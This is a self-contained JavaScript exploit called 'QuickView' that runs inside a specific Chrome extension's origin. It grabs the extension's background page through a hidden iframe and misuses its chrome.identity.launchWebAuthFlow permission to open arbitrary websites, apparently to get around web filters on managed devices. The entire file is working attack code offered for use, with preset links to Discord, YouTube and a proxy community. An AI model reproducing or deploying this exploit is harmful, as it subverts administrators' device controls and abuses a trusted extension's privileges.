(function(){
  if (window.origin !== "chrome-extension://bpmcpldpdmajfigpchkicefoigmkfalc") {
    alert("You ran this script on the wrong page.");
    return;
  }
  if (window.quickview) {
    alert("QuickView is already active in this tab.");
    return;
  }
  window.quickview = true;

  let from_id = (id) => {return document.getElementById(id)};
  let style = `
  * {
    font-family: "Inter", sans-serif;
    color: #e2e8f0
  }

  body {
    background-color: #0f172a;
  }

  .button {
    background-color: #0284c7;
    text-decoration: none;
    user-select: none;
    font-size: 14px;
    padding: 10px;
  }

  #title_div {
    display: flex;
    align-items: center;
    gap: 16px;
  }  

  #input_div {
    display: flex;
    gap: 6px
  }

  #url_input {
    padding: 9px;
    background-color: #1e293b;
    border: 2px solid #334155;
    width: 100%;
  }

  #webview_button {
    width: 150px;
    text-align: center;
  }

  #content {
    max-width: 600px;
    margin-left: auto;
    margin-right: auto;
  }`;

  let html = `
  <!DOCTYPE html>
  <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width">
      <link rel="stylesheet" href="https://fonts.xz.style/serve/inter.css">
      <link rel="icon" href="https://quickview-exploit.pages.dev/img/icon_32.png">
      <title>QuickView GUI</title>
      <style>
        ${style}
      </style>
    </head> 
    <body>
      <div id="content">
        <div id="title_div">
          <img id="icon_img" src="https://quickview-exploit.pages.dev/img/icon.png" height="64px">
          <h1>QuickView</h1>
        </div>
        <div id="input_div">
          <input id="url_input" placeholder="Enter a URL here.">
          <a id="webview_button" class="button" href="#">Open Webview</a>
        </div>
        <p id="status_text"></p>
        <h2>Preset URLs:</h2>
        <ul id="urls_list"></ul>

        <h2>Credits:</h2>
        <p>QuickView was created by Bypassi#7037 and vk6#7391, and it is licensed under the <a href="https://www.gnu.org/licenses/gpl-3.0.txt" target="_blank">GNU GPL v3</a>. The source code is available at: <a href="https://github.com/ading2210/quickview" target="_blank">https://github.com/ading2210/quickview</a></p>
      </div>
    </body>
  </html>`;

  let urls = {
    "Google": "https://google.com",
    "Youtube": "https://youtube.com",
    "Discord": "https://discord.com",
    "Reddit": "https://reddit.com",
    "Titanium Network": "https://titaniumnetwork.org"
  }
  let bg = null;

  function get_background() {
    return new Promise((resolve, reject) => {
      let iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = window.origin + "/scripts/common/elements/hyperlink/hyperlink.html";
      iframe.onload = () => {
        resolve(iframe.contentWindow.chrome.extension.getBackgroundPage());
        iframe.remove();
      }
      document.body.append(iframe);
    });
  }

  function setup_page() {
    let urls_list = from_id("urls_list");
    let url_input = from_id("url_input");
    for (let [name, url] of Object.entries(urls)) {
      let li = document.createElement("li");
      let link = document.createElement("a");
      link.innerHTML = name;
      link.onclick = () => {
        url_input.value = url;
      }
      link.href = "#";

      li.append(link);
      urls_list.append(li);
    }
  }

  function button_callback() {
    let url = from_id("url_input").value;
    let popup_html = `data:text/html,
    <html>
      <head>
        <script>
          setTimeout(() => {
            window.location.href = "${encodeURIComponent(url)}";
          }, 500);
        </script>
      </head>
      <body>
        <p>Redirecting to ${url}</p>
      </body>
    </html>`;
    bg.chrome.identity.launchWebAuthFlow(
      {
        url: popup_html, 
        interactive: true 
      }, 
      () => {}
    );
  }

  /*
  function setup_listener() {
    if (bg.listner_active) {return}
    bg.listner_active = true;

    bg.chrome.tabs.onUpdated.addListener((tab_id, event, tab) => {
      if (event.status !== "loading") return;
      if (tab.url !== "https://www.google.com/#%20") return;

      let url = bg.prompt("Which URL should be opened?", "https://google.com");
      bg.chrome.identity.launchWebAuthFlow(
        { url: url || "https://google.com", interactive: true },
        () => {}
      );
    });
  }
  */

  async function init() {
    bg = await get_background();
    document.write(html);
    setup_page();
    //setup_listener();
    from_id("webview_button").onclick = button_callback;
  }

  init();

})()